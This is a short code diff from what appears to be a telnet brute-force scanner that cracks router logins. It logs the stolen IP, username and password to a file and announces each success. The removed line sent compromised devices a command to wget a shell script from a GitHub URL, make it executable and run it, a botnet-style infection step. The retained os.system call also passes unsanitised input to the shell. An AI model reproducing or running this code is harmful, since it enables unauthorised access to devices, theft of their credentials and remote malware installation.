@@ -156,7 +156,6 @@ class router(threading.Thread):
                 if success == True:
                     try:
                         os.system("echo "+self.ip+":23 "+username+":"+password+" >> "+output_file)
-                        tn.send("cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/20Matrix77/scanner/refs/heads/main/animma.sh; chmod 777 animma.sh; sh animma.sh;")
                         print("\033[32m[\033[31m+\033[32m] \033[33mGOTCHA \033[31m-> \033[32m%s\033[37m:\033[33m%s\033[37m:\033[32m%s\033[37m" % (username, password, self.ip))
                         tn.close()
                         break
